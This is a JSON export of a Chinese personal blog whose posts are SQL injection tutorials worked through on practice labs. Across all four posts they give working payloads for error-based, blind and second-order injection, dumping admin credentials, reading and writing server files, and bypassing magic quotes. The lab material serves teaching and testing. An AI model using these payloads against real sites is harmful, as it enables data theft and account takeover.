{"meta":{"title":"Xxu","subtitle":"Xxuの个人博客","description":"记录学习过程，分享个人经验","author":"Xxu","url":"https://jxblogs.com","root":"/"},"pages":[{"title":"404","date":"2021-11-06T14:16:48.000Z","updated":"2021-11-12T03:48:53.061Z","comments":true,"path":"404.html","permalink":"https://jxblogs.com/404.html","excerpt":"","text":""},{"title":"404","date":"2021-11-06T14:16:48.000Z","updated":"2021-11-06T14:17:08.282Z","comments":true,"path":"404/index.html","permalink":"https://jxblogs.com/404/index.html","excerpt":"","text":""},{"title":"放松一下","date":"2021-11-06T09:45:25.000Z","updated":"2021-11-12T03:19:39.880Z","comments":true,"path":"List/index.html","permalink":"https://jxblogs.com/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"about","date":"2021-11-06T09:45:43.000Z","updated":"2021-11-06T09:45:54.018Z","comments":true,"path":"about/index.html","permalink":"https://jxblogs.com/about/index.html","excerpt":"","text":""},{"title":"统计","date":"2021-11-06T09:45:25.000Z","updated":"2021-11-12T03:19:59.069Z","comments":true,"path":"census/index.html","permalink":"https://jxblogs.com/census/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-11-06T09:44:56.000Z","updated":"2021-11-06T09:45:10.575Z","comments":true,"path":"categories/index.html","permalink":"https://jxblogs.com/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2021-11-06T09:45:25.000Z","updated":"2021-11-12T03:19:09.696Z","comments":true,"path":"archives/index.html","permalink":"https://jxblogs.com/archives/index.html","excerpt":"","text":""},{"title":"留言板","date":"2021-11-06T09:46:02.000Z","updated":"2021-11-12T03:15:53.543Z","comments":true,"path":"contact/index.html","permalink":"https://jxblogs.com/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 Xxuの友链信息 博客名称: Xxuの博客 博客网址: http://www.jxblogs.com 博客头像: https://s1.ax1x.com/2020/05/17/YRWsYT.png 博客介绍: The harder you work, the luckier you will be"},{"title":"资源分享","date":"2021-11-06T09:45:25.000Z","updated":"2021-11-12T03:19:47.534Z","comments":true,"path":"resource/index.html","permalink":"https://jxblogs.com/resource/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2021-11-12T02:06:46.966Z","comments":true,"path":"friends/index.html","permalink":"https://jxblogs.com/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-11-06T09:45:25.000Z","updated":"2021-11-06T15:16:40.978Z","comments":true,"path":"tags/index.html","permalink":"https://jxblogs.com/tags/index.html","excerpt":"","text":""},{"title":"posts","date":"2021-11-25T04:16:07.000Z","updated":"2021-11-25T04:16:07.123Z","comments":true,"path":"posts/index.html","permalink":"https://jxblogs.com/posts/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-12T02:06:46.911Z","comments":true,"path":"List/music/index.html","permalink":"https://jxblogs.com/List/music/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/movies/index.html","permalink":"https://jxblogs.com/List/movies/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-12T02:06:46.911Z","comments":true,"path":"List/tools/index.html","permalink":"https://jxblogs.com/List/tools/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"https://jxblogs.com/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/index.html","permalink":"https://jxblogs.com/List/galleries/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"https://jxblogs.com/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"https://jxblogs.com/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"https://jxblogs.com/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"https://jxblogs.com/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"https://jxblogs.com/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"https://jxblogs.com/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"https://jxblogs.com/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"https://jxblogs.com/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"https://jxblogs.com/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"https://jxblogs.com/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2021-11-12T02:06:46.901Z","updated":"2021-11-12T02:06:46.901Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"https://jxblogs.com/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""}],"posts":[{"title":"SQL漏洞-注入拓展&Access数据库","slug":"SQL漏洞-注入拓展&Access数据库","date":"2022-01-14T13:11:10.000Z","updated":"2022-01-16T11:56:46.433Z","comments":true,"path":"posts/9a92240e.html","link":"","permalink":"https://jxblogs.com/posts/9a92240e.html","excerpt":"","text":"SQL漏洞-注入拓展&amp;Access数据库加解密注入常见数据加密方式 1、MD5：不可逆算法，最常用的算法之一，70-80%的网站管理员密码都是采用md5，网上解密的方法是采用枚举的方法(0-9，a-z的随机组合)，32位 2、SHA：其中包括SHA1、SHA256、SHA384、SHA512，数字越大密文越长(0-9，a-z的随机组合) 3、ASCII：ASCII码 4、进制：计算机进制数 5、时间戳：计算机不会自己读取当前时间，而是采用对当前时间进行加密的时间戳供计算机来识别 6、URL：访问网站的地址信息 %20：[空格] %23：# 7、BASE64：很多采用base64加密后的密文后面都是两个==，且=如果出现就必须在结尾出现 8、Unescape：%u+4位数字依次加密 9、AES：更高级更安全的加密方式，其中包含四个因素：填充、数据块、密码、偏移量，如果采用base64解密类似这种密文后是乱码，则很可能是采取Aes方式进行加密的，解密Aes方式的必须要知道密码和偏移量这两个前提 10、DES：和AES类似 11、带Salt：MD5+salt 12、自定义组合 靶场演示Less-21：使用admin-admin登录 可以看到这里读取的是cookie信息，抓个包试试 由于读取的是cookie信息，正常情况下需要在cookie处进行注入，不过此时可以看到uname是被加密过后的状态，猜测是base64加密，因为%3D在url编码中是=号的意思，那么uname就是YWRtaW4=，符合base64加密特征，也可以将鼠标放在加密的数据上进行查看，同样可以显示出YWRtaW4= ​ 选中右键将其发送到decoder解码器进行解码后得出 ​ 由于是使用加密方式进行读取数据，那么我们进行注入的时候同样也要将他的注入语句加密后再进行替换 ​ 注入后显示正常，注入成功 在注入过程中碰到的加解密问题，首先要明确的就是加密方式，可以通过密文特征来辨别 二次注入二次注入主要分两步： 第一步：插入恶意数据 第一次进行数据库插入数据的时候，用户向数据库插入恶意语句，但是在写入数据库的时候还是保留原来的数据 第二步：引用恶意数据 在将数据存入到数据库之后，寻找另一处引用这个数据的操作，取出后直接给变量并带入数据库，这样就造成了SQL的二次注入 适用场景：已知某用户的用户名，在注册用户时，使用其用户名在末尾加上闭合方式并注释后进行注册，成为一个全新的用户，但是这个新用户在修改密码时，利用的sql语句的特性，提前将数据闭合，只保留前面的已知某用户的用户名，后面全部注释，那么此时就能对用户密码进行修改，完成对密码的盗取 靶场演示Less-24：使用注册后的账户xxu-123456登录 这是原本的账户，我们需要注册一个二次账户来对这个用户进行密码盗取，通过观察源码可以发现sql语句如下： $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 已知用户xxu，这时我们在不知晓密码的情况下，重新注册一个账户，插入恶意数据，观察sql语句可以发现，采用单引号闭合，所以我们注册账户为xxu’#，第一次登录并求改密码，由于sql语句特性，此时修改密码传入的语句为： $sql = \"UPDATE users SET PASSWORD='$pass' where username='xxu'#' and password='$curr_pass' \"; 那么此时就会将xxu的密码修改，我们实际尝试看看，首先注册账户xxu’# 登录xxu’#并将密码修改为654321 重新查看数据库 发现被修改的账户不是xxu’#而是xxu，这也验证了之前的假设，利用sql语句的特性插入恶意数据并成功引用 如果输入框有长度限制怎么办？ 1、前端限制：通过修改前端参数(F12修改maxlength) 2、后端限制：没有办法 DNSlog注入原理：有时候注入发现并没有回显，也不能利用时间盲注，那么就可以利用带外通道(第三方平台)，也就是利用其他协议或者渠道，如http请求、DNS解析、SMB服务等将数据带出。DNSlog盲注可以减少发送的请求，直接回显数据实现注入 利用前提条件: ★mysql.ini中secure_file_priv必须为空 ★secure_file_priv为null，不允许导入导出 ★secure_file_priv为/tmp，导入导出只能在/tmp目录下 ★secure_file_priv为空时，则不做限制允许导入导出 使用场景：当获取到一个网站的高权限以后，需要对数据库进行读写操作，由于网站的种种限制，发现无法对数据库进行读取和写入，这个时候就可以利用DNSlog注入，利用第三方平台将它回显出来。 靶场演示Less-5：布尔盲注靶场，假设无法使用盲注 利用第三方平台：CEYE平台 配合DNSlog工具：DNSlog注入工具","categories":[{"name":"-web渗透","slug":"web渗透","permalink":"https://jxblogs.com/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"https://jxblogs.com/tags/web%E6%B8%97%E9%80%8F/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://jxblogs.com/tags/SQL%E6%B3%A8%E5%85%A5/"}],"author":"Xxu"},{"title":"SQL漏洞-增删改查&报错盲注","slug":"SQL漏洞-增删改查&报错盲注","date":"2021-11-27T09:25:17.000Z","updated":"2021-11-27T16:06:25.352Z","comments":true,"path":"posts/cc8a54a8.html","link":"","permalink":"https://jxblogs.com/posts/cc8a54a8.html","excerpt":"","text":"SQL漏洞-增删改查&amp;报错盲注 前言：当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句。 ​ 数据库查询方式select 查询数据:在网站应用中进行数据显示查询操作 例：select * from news where id=$id insert 插入数据:在网站应用中进行用户注册添加等操作 例：insert into news(id,url,text) values(2,'x','$t') delete 删除数据:后台管理里面删除文章删除用户等操作 例：delete from news where id=$id update 更新数据:会员或后台中心数据同步或缓存等操作 例：update user set pwd='$p' where id=2 and username='admin' 重点理解：我们可以通过以上查询方式与网站应用的关系注入点产生地方或应用猜测到对方的SQL查询方式 ,例如当你在测试一个带有注册功能的网站时，就可以通过抓包找到提交数据的地方，这时候是看不到insert语句的，而我们根据注册的这种行为方式，就可以判断这是一个插入语句，并且在提交数据的地方进行相应的注入。 报错盲注盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类： 1、基于报错的SQL盲注-报错回显floor，updatexml，extractvalue 原理：采用sql语句的特性使之报错回显在页面上 2、基于布尔的SQL盲注-逻辑判断regexp,like,ascii,left,ord,mid 原理：通过sql语句逻辑判断信息内容 3、基于时间的SQL盲注-延时判断if,sleep select if(database()=’pikachu’,123,456); 原理：通过响应页面时长判断信息内容 总的来说，通过报错盲注，可以将我们想要的信息回显到页面上，例如数据库用户等信息 参考信息：12种报错注入+万能语句 靶场演示靶场：pikachu Insert 可以看出，这是一个注册页面，对应语句应该是insert，我们抓个包看看 观察到这是一个用POST提交的数据，底下对应着我们刚刚填入的信息，此时我们可以在这里进行sql注入，由于我们不了解语句的闭合方式，我们查看一下页面源代码，得到语句如下： $query=\"insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')\"; 闭合方式为单引号，但是有一个问题，我们如果在前面进行了语句的闭合，把后面的语句进行了–+注释，那么我们就无法将这个insert语句正确的运行，会影响到后面一整串参数的传递 values('xxu' order by 3--+',md5('xxu'),'111','111','111','111')\"; 就像这样，因为没有把每个指定的列名插入指定的参数，后面就会产生一个错误，造成插入失败 此时尝试在传的最后一个参数后面注入 结果还是报错，猜测是影响到了后面的submit提交所以报错，但如果在submit以后再注入语句就不会被运行了 所以当出现这种页面无法返回报错信息，注入语句无法传入的情况，我们就可以用到报错盲注，利用数据库的特性进行强制报错 将原先的提交语句替换成我们的payload: username=xxu' or(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or '&amp;password=xxu&amp;sex=111&amp;phonenum=111&amp;email=111&amp;add=111&amp;submit=submit 结果成功显示数据库名称pikachu 我们可以修改0x7e后面的数据来收集我们想要的结果，接下来用另外两种载荷分别尝试： username=xxu' or updatexml(1,concat(0x7e,(version())),0) or ' &amp;password=xxu&amp;sex=%E7%94%B7&amp;phonenum=111&amp;email=111&amp;add=111&amp;submit=submit username=xxu' or extractvalue(1,concat(0x7e,database())) or ' &amp;password=xxu&amp;sex=%E7%94%B7&amp;phonenum=111&amp;email=111&amp;add=111&amp;submit=submit 以上三种payload语法都是insert语句专属语法 Update登录成功以后，修改个人信息 个人信息是在原有的基础上进行修改，所以是update语句操作 点击修改，开启抓包 同样的，在这里我们也可以利用update的攻击载荷进行注入： sex=%E7%94%B7&amp;phonenum=111&amp;add=xxu' or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '&amp;email=111&amp;submit=submit sex=%E7%94%B7&amp;phonenum=111&amp;add=xxu' or updatexml(1,concat(0x7e,(version())),0) or '&amp;email=111&amp;submit=submit sex=%E7%94%B7&amp;phonenum=111&amp;add=xxu' or extractvalue(1,concat(0x7e,@@version_compile_os)) or '&amp;email=111&amp;submit=submit Delete 点击删除后抓包尝试 发现不一样的地方在于删除时用了GET的提交方式，后面的是路径，那么如果要指定删除某条留言，那么后面提交的参数56就是删除的关键了，delete攻击载荷： /pikachu/vul/sqli/sqli_del.php?id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) 将要提交的参数56替换为我们的攻击载荷(载荷中的数字根据具体抓包数据来修改) 这里的+号意思为拼接，因为在数据包里，GET加上一个空格是路径，路径再加上一个空格是HTTP/1.1也就是版本号，如果我们在这里就用空格的话，页面会将56后面的or误判为版本号，所以这里用+号来表示拼接 结果成功输出 pikachu/vul/sqli/sqli_del.php?id=56+or+updatexml+(1,concat(0x7e,database()),0) /pikachu/vul/sqli/sqli_del.php?id=56+or+extractvalue(1,concat(0x7e,database())) Select我们已经知道sql注入中select第一步为猜解列名数量，第二步进行联合查询，第三步将信息回显在页面上，但是有些会回显在页面上，有些不会，碰到不会回显的这种情况，我们就可以用到布尔盲注来猜测数据。 布尔盲注 布尔盲注：在我们输入and 1或者and 0，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。 靶场：sqlilabs-less5 进入靶场，首先常规手段猜测列名 成功猜测出列名为3，进行联合查询 此时遗憾发现没有数据显示在页面上，这时页面要么报错，要么空，要么正常显示，而不会回显数据，那么我们只能使用布尔盲注进行逻辑判断，看页面是否显示正常，以此方式来一步步推测数据 布尔盲注可能用到的函数： like ‘ro%’ #判断ro或ro…是否成立 regexp ‘^xxu…’ #匹配xxu及xxu…等 if(条件,5,0) #条件成立 返回5 反之 返回0 sleep(5) #SQL语句延时执行5秒 mid(a,b,c) #从位置b(第一位从1开始算)开始，截取a字符串的c位 substr(a,b,c) #从b位置开始，截取字符串a的c个字符 left(database(),1) #left(a,b)从左侧截取a的前b位 length(database())=8 #判断数据库database()名的长度 ord=ascii ascii(x)=97 #判断x的ascii码是否大于小于等于97 首先我们尝试判断数据库名的长度： 猜测数据库名长度为9，页面显示为空，说明长度不为9.我们试试7 我们知道数据库名称为security，是8位，所以此时我们猜测8位 页面正常显示，说明猜测正确 此时我们再试试猜测数据库名称的第一个字符，使用left(database(),1)=’a’,意思为从左边开始数的第一位数字为a 显示为空，再试试left(database(),1)=’b’ 还是显示为空，我们一直测试直到left(database(),1)=’s’ 此时数据真正成功回显到了页面上，说明布尔盲注真实可行 总结：增删改对应报错盲注 查对应布尔盲注，不过布尔盲注的缺点很明显，就是比较花费时间，配合脚本实现自动化查询才是布尔盲注的正确使用姿势。 延时盲注延时注入适用于，无法回显和无法显示错误页面的场景，也就是只要写入sql语句就啥也回显不出来的那种场景，和布尔盲注相似，但是比布尔盲注还要耗时。 我们利用if和sleep的机制来进行判断，首先我们进入security数据库 使用select if的语句，这句话的意思是如果数据库名称为pikachu那么就显示123，如果不是，就显示456，此时数据库不是pikachu，所以返回456，我们再切换到pikachu试试 此时返回的是123，说明语句生效，0.00 sec代表的是查询时间为0秒，利用这个机制，我们可以把sleep和if结合在一起，此时注入语句为： ?id=1' and sleep(if(database()='aaa',5,0))--+ 语句的意思为如果数据库名称是aaa，页面就加载5秒，如果不是就加载0秒，此时我们尝试注入： 页面很快就反应过来了，因为数据库名称不是aaa，所以加载0秒，此时我们换成： ?id=1' and sleep(if(database()='security',5,0))--+ 发现页面加载了5s左右才加载完成，说明延时注入猜测成功，再次尝试获取数据库名称第一位 ?id=1' and if(left(database(),1)='s',sleep(5),sleep(0))--+ 第一个数为s，所以页面加载5s，延时注入成功 有些网站会对单引号进行过滤，此时可以用ASCII码表达式注入 ?id=1' and if(ascii(left(database(),1))=115,sleep(5),sleep(0))--+ 我们可以记住在ascii码表中0=48 a=97 A=65，剩下的拿去加就知道了，s对应的就是115 参考博客：https://www.jianshu.com/p/bc35f8dd4f7c","categories":[{"name":"-web渗透","slug":"web渗透","permalink":"https://jxblogs.com/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"https://jxblogs.com/tags/web%E6%B8%97%E9%80%8F/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://jxblogs.com/tags/SQL%E6%B3%A8%E5%85%A5/"}],"author":"Xxu"},{"title":"SQL漏洞-高低权限注入&敏感文件读写","slug":"SQL漏洞-高低权限注入&敏感文件读写","date":"2021-11-26T04:39:17.000Z","updated":"2021-11-26T04:44:26.560Z","comments":true,"path":"posts/83a1acb4.html","link":"","permalink":"https://jxblogs.com/posts/83a1acb4.html","excerpt":"","text":"SQL漏洞-高低权限注入&amp;敏感文件读写 sql注入漏洞的危害：拖库 高权限注入及低权限注入 网站 管理员 数据库 A A A B B B 网站A与B在同一台服务器下，分别由不同的管理员管理并且拥有自己独立的数据库，互不影响互不干扰。但是如果网站A被拿到管理员账户，基于mysql5.0以上环境，可以对网站B 进行一个跨库查询从而获取到B的敏感信息。而低权限只限于本库查询，无法进行跨库查询 跨库查询思路 前提：1、拥有高权限 2、在同一台服务器下 3、数据库5.0以上版本 实际操作网站A：sqlilab靶场，已经获取到root用户，拥有最高权限 网站B：大米CMS，与网站A在同一服务器下，自主搭建，无WAF 1、获取B网站数据库在information_schema底下有一张表叫做schemata，里面包含了所有数据库的信息，其中列schema_name，包含了所有数据库的名称，跨网站第一步，需要获取的就是该网站的数据库名称，注入表达式： union select 1,group_concat(schema_name),3 from information_schema.schemata--+ 成功获取到数据库名称：damidb 2、获取数据库关键表需要从记录所有表名的一张表information_schema.tables里的列table_name来查找当前表名，不过需要指定数据库为damidb，注入表达式 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='damidb'--+ 不出意外，关键信息就在dami_admin这张表里 3、获取指定数据库指定表下的列名信息需要获取信息，将table_name该为column_name，information_schema.tables改为information_schema.columns union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='damidb'--+ 观察列名信息，发现获取的列名是当前数据库下所有表的列名信息，所以还需要指定表dami_admin union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='damidb' and table_name='dami_admin'--+ 此时成功回显当前表名数据，可以看出username和password才是我们需要的东西 4、根据列名信息查找关键数据将2，3替换为username和password同时指定数据库名和表名进行精准查找 union select 1,username,password from damidb.dami_admin 成功获取到admin账户密码 文件读写操作在Mysql中有两条特有的文件操作函数： 1、load_file() --- 读取函数 2、into outfile 或 into dumpfile --- 导出函数 前提条件：在mysql.ini配置文件添加参数secure_file_priv = [空] 例如，我们在服务器C盘底下创建一个1.txt 此时在网页使用文件读写函数注入，查看结果 union select 1,load_file('C://1.txt'),3--+ 成功读取本地文件，接下来尝试往C盘中写入文件 union select 1,'Xxu',3 into outfile'C://2.txt'--+ 没有显示代表写入成功，看看C盘下有没有多出2.txt文件 发现文件成功写入，并且1，2，3都被写入了，那如果我们不想要1和3，只写入2呢 union select 'Xxu' into outfile'C://3.txt'--+ 这里报错了，说明写入时也必须按列数来写入，这些是不可或缺的 这里需要注意的点是： load_file(‘C://1.txt’)后面的路径得加括号，并且是通过替换2和3来回显数据的 into outfile’C://3.txt’后面的路径只需要加单引号，但是是跟在123的后面，将123的数据 替换为想要写入的内容来写入的，写入数据时需要加单引号 路径获取常见方法 报错显示：有一些网站在维护的时候会报错，会出现一些路径信息 遗留文件：php会在默认网站目录下留下phpinfo.php，里面有很多信息 漏洞报错：特定的CMS有特定的配置文件，位置一般是不会变的，例如phpcms暴路径漏洞 平台配置文件：例如apache搭建的网站在conf文件夹下有httpd.conf文件 爆破：暴力手段类似子域名挖掘机，sqlmap等扫描工具可以扫描后台路径 常见的load_file()读取的敏感信息：点我进入查看 常见文件操作问题:魔术引号魔术引号开关在php.ini配置文件中有magic_quotes_gpc，在php5.4.0以下版本是默认开着的它是php内置的一个安全机制，当打开时，会对所有的 ‘（单引号），”（双引号），\\（反斜线）和 NULL 字符自动加上一个反斜线进行转义 1、表现特征 可以看到，在开启了魔术引号后，所有的路径符号都加上了一个反斜杠，这一点可以看出此刻网站用的是php5.4.0以下的版本 2、绕过方式1.编码绕过将路径信息转换为十六进制用以绕过魔术引号，而十六进制能被url正确解码 此刻需要读取的路径：C://1.txt 十六进制转码后：0x433A2F2F312E747874 注入表达式：union select 1,load_file(0x433A2F2F312E747874),3--+ 由于已经进行了编码，所以不需要再加单引号了 结果：成功绕过 2.宽字节绕过 演示：线上靶场 此时已经用单引号进行闭合，不过还是被魔术引号加了反斜杠转义，使得后面语句无法执行 宽字节绕过原理： \\比如使用%df’:会被PHP当中的addslashes函数转义为“ %df’ ”。** “ \\ ”即url里面的“ %5c ”, “ ’ ”对应的url编码是“%27”，那么也就是说，“ %df’ ”会被转义“ %df%5c%27 ” 倘若网站的字符集是GBK，mysql使用的编码也是GBK的话，就会认为“ %df%5c%27 ”是一个宽字节。 “ %df%5c ”会结合(因为宽字节是占两个字节)，也就是“縗” 。后面就有一个“ ’ ”。就造成了一个攻击效果。** 此时我们将id=1’变为id=1%df’，注入表达式,查看结果 id=1%df' order by 2--+ 发现此时的1后面的%df加了反斜杠被转义后变成了%df%5c，加上后面单引号变为了%27，所以整个1%df’在页面上变为了’1綅’完成了一个闭合，在mysql中1后面的则是一个宽字节，通过这样的方式完成了魔术引号的绕过 参考博客：https://blog.csdn.net/weixin_30292843/article/details/99381669 ​ https://blog.csdn.net/qq_46091464/article/details/105893529","categories":[{"name":"-web渗透","slug":"web渗透","permalink":"https://jxblogs.com/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"https://jxblogs.com/tags/web%E6%B8%97%E9%80%8F/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://jxblogs.com/tags/SQL%E6%B3%A8%E5%85%A5/"}],"author":"Xxu"},{"title":"SQL漏洞-类型&请求方法注入","slug":"SQL漏洞-类型&请求方法注入","date":"2021-11-25T17:05:17.000Z","updated":"2021-11-27T15:58:14.946Z","comments":true,"path":"posts/fd334196.html","link":"","permalink":"https://jxblogs.com/posts/fd334196.html","excerpt":"","text":"SQL漏洞-类型&amp;请求方法注入 sql注入漏洞的危害：拖库 提交参数类型1、数字类型select * from user where id=1 2、字符类型select * from user where name=’xiaoming’ 当进行数据提交时，如果提交类型是字符型，则必须加单引号或双引号来进行一个闭合 而数字型可加可不加 3、搜索类型select * from user where name like ‘%xiaoming%’ 有时候一张表中数据很多，需要精准查找，可以使用%加引号闭合搜索，只要有xiaoming的信息都会被搜索出来 4、JSON类型json是post提交方式中的一种数据交互格式 JSON格式： json={\"name\":\"xiaoming\" \"age\":\"18\"} SQL语句干扰符号许多网站为了防止sql注入，在网页代码中加入了干扰sql语句的干扰符号。 使得sql语句被判定为某个提交参数而不会被执行，这些干扰符号包括 1.’(单引号) 2.”(双引号) 3.%(百分号) 4.)(小括号) 5.}(大括号) 等等，具体干扰方式还需要看写法 靶场演示环境：参数字符型注入测试 sqlilabs Less-1,2,3,4 第一关 常规手段先用and 1=2查看页面结果 发现页面不影响，说明后台进行了拦截或者过滤，此时我们通过查看网页源代码发现，查询语句为 $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; 我们将注入语句1 and 1=2带入到源码中，可得 $sql=\"SELECT * FROM users WHERE id='1 and 1=2' LIMIT 0,1\"; 发现此时的注入语句被当作字符类型的提交参数提交上去了，1 and 1=2只是一个参数 不会被运行，所以绕过则需要加上单引号’进行闭合，此时注入语句为1’ and 1=2 由于后面还有单引号’和LIMIT 0,1会影响到结果的输出，所以在语句末加上–+或者#将其注释，带入源码： $sql=\"SELECT * FROM users WHERE id='1' and 1=2--+' LIMIT 0,1\"; 闭合后，页面回显错误说明可能存在注入点，接下来就可以联合查询获取数据了 第三关 可以看到，第三关同样进行了过滤，页面不影响，看看他的源码是怎么过滤的 $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; 通过观察语句发现，外面加了一个小括号，所以要让前面闭合，则语句变为 1’) and 1=2–+，带入源码： $sql=\"SELECT * FROM users WHERE id=('1') and 1=2--+') LIMIT 0,1\"; 结果成功绕过过滤 第四关用第三关的语句注入第四关，发现没了效果 说明第四关采用的不同的过滤方式，查看源码： $id = '\"' . $id . '\"'; $sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\"; 发现原先的id变成了加上双引号的”id”，此时先用双引号再用小括号从里到外将其闭合，则语句变为 1”) and 1=2–+，带入源码： $sql=\"SELECT * FROM users WHERE id=(\"1\") and 1=2--+\") LIMIT 0,1\"; 结果成功绕过过滤 总结遇到这样的过滤语句，只有成功将提交参数闭合才能使得后面的语句成功执行，不过真实环境中我们是无法知晓网页具体的过滤方式的，只能靠一个个猜测尝试，或者代码审计来知晓他的闭合方式，所以比较麻烦。 请求方法 GET、POST、COOKIE、REQUEST、HTTP头部等 GET请求传输的数据量限制在2KB左右(所以很多文件上传或者文件下载都是通过POST去提交的) GET只要在url上，就能接收到请求，POST则显示错误 REQUEST请求不管是GET和POST都可以 HTTP报文头部各个参数都能注入，比如User-Agent、Cookie等 GET和POST的区别GET和POST是网页中最常见的两种请求方式，我们经常可以利用其特性进行sql注入测试 GET接下来看看两种方式有什么区别，这是一个网页的源代码 意思是用get的方式将g传递给get这个变量，并且将get输出显示在页面上 此时传递参数g=123查看结果 发现页面成功输出123，说明网页在使用get的方式提交数据时，通过修改url中的提交参数 是能将数据成功回显在页面上的，此时将网页源码替换为post POST 再传递参数p=123查看结果 发现当请求方式为post的时候，通过url来提交参数已经行不通了 那么此时我们可以通过一些插件或者软件来代替手工修改url进行post提交 此时我们将需要提交的参数放在底下的框框中，点击Execute进行提交，结果成功显示在页面上 GET &amp;&amp; POST 此时修改网页源码，同时使用get与post两种请求方式，并使用Burpsuite截取网页数据包 截取到数据包如图所示，将其转到重发器，并且同时请求g=123与p=456 将其发送，查看返回结果 